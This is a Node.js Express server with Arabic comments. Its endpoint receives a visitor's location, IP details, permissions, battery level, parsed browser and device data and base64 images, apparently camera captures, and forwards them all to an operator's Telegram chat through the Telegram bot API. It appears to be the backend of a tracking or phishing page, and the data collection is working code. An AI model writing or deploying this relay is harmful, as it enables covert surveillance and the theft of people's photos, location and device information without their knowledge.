const express = require('express');
const bodyParser = require('body-parser');
const UAParser = require('ua-parser-js');
const axios = require('axios');
const FormData = require('form-data');
const app = express();
const PORT = process.env.PORT || 3000;

// توسيع الحد الأقصى لحجم الطلب لاستيعاب الصور (حوالي 10 ميجا)
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
app.use(bodyParser.json({ limit: '10mb' }));

// نقطة النهاية لاستقبال البيانات
app.post('/submitData', async (req, res) => {
  try {
    // استخراج البيانات من الطلب
    const { chatId, imageDatas, location, permissions, ipInfo, battery } = req.body;

    // الحصول على User-Agent من الهيدر
    const userAgent = req.headers['user-agent'] || '';

    // تحليل User-Agent باستخدام ua-parser-js
    const parser = new UAParser(userAgent);
    const browser = parser.getBrowser();      // { name, version }
    const os = parser.getOS();                // { name, version }
    const device = parser.getDevice();        // { vendor, model, type }
    const engine = parser.getEngine();        // { name, version }

    // تكوين اسم متصفح دقيق (يحاكي اسم حزمة التطبيق إن وجد)
    // بعض المتصفحات تظهر في اسم المنتج مثل "Samsung Browser" أو "UCBrowser"
    const browserName = browser.name || 'غير معروف';
    const browserVersion = browser.version ? ` ${browser.version}` : '';
    const osName = os.name || '';
    const osVersion = os.version ? ` ${os.version}` : '';
    const deviceVendor = device.vendor ? ` (${device.vendor})` : '';
    const deviceModel = device.model ? ` ${device.model}` : '';
    let detailedBrowser = `${browserName}${browserVersion}`;
    if (osName) detailedBrowser += ` - ${osName}${osVersion}`;
    if (deviceVendor || deviceModel) detailedBrowser += ` على${deviceVendor}${deviceModel}`;

    // (اختياري) إضافة محرك العرض إن كان مفيداً
    const engineName = engine.name ? ` (محرك: ${engine.name})` : '';
    detailedBrowser += engineName;

    // البيانات النصية التي ستُرسل إلى تلجرام
    const text = `📱 **بيانات جديدة من المستخدم**
    
🆔 **Chat ID**: ${chatId || 'غير موجود'}
📍 **الموقع**: ${location || 'غير متاح'}
🔐 **الصلاحيات**: ${permissions || 'غير محددة'}
🌐 **معلومات IP**: ${ipInfo || 'غير متوفرة'}
🔋 **حالة البطارية**: ${battery || 'غير معروفة'}
🌍 **المتصفح الدقيق**: ${detailedBrowser}
🖥️ **User-Agent الخام**: ${userAgent}
    `;

    // إعداد بيانات البوت من متغيرات البيئة
    const botToken = process.env.BOT_TOKEN;
    const chatIdTelegram = process.env.CHAT_ID || chatId; // استخدم الـ chatId المرسل إن لم يُحدد

    if (!botToken) {
      console.error('❌ BOT_TOKEN غير مضبوط في متغيرات البيئة');
      return res.status(500).send('Bot token missing');
    }

    // إرسال الرسالة النصية إلى تلجرام
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatIdTelegram,
      text: text,
      parse_mode: 'Markdown'
    });

    // إرسال الصور (إن وجدت) كـ مستندات (Document)
    if (imageDatas) {
      const imagesArray = imageDatas.split(',').filter(img => img.trim() !== '');
      for (let i = 0; i < imagesArray.length; i++) {
        const imgBase64 = imagesArray[i];
        // تحويل base64 إلى Buffer
        const buffer = Buffer.from(imgBase64, 'base64');
        // إنشاء FormData لإرسال الملف
        const form = new FormData();
        form.append('chat_id', chatIdTelegram);
        form.append('document', buffer, {
          filename: `image_${i+1}.jpg`,
          contentType: 'image/jpeg',
        });

        await axios.post(`https://api.telegram.org/bot${botToken}/sendDocument`, form, {
          headers: form.getHeaders(),
          maxBodyLength: Infinity,
        });
      }
    }

    // الرد على العميل
    res.status(200).send('✅ تم استلام البيانات وإرسالها إلى البوت بنجاح.');
  } catch (error) {
    console.error('❌ حدث خطأ:', error.message);
    // إرسال خطأ إلى تلجرام للمتابعة (اختياري)
    if (process.env.BOT_TOKEN && process.env.CHAT_ID) {
      try {
        await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
          chat_id: process.env.CHAT_ID,
          text: `⚠️ خطأ في الخادم: ${error.message}`
        });
      } catch (e) {}
    }
    res.status(500).send('❌ حدث خطأ أثناء معالجة الطلب.');
  }
});

// نقطة صحّة (Health Check) لـ Render
app.get('/', (req, res) => {
  res.send('✅ الخادم يعمل');
});

app.listen(PORT, () => {
  console.log(`🚀 الخادم يعمل على المنفذ ${PORT}`);
});
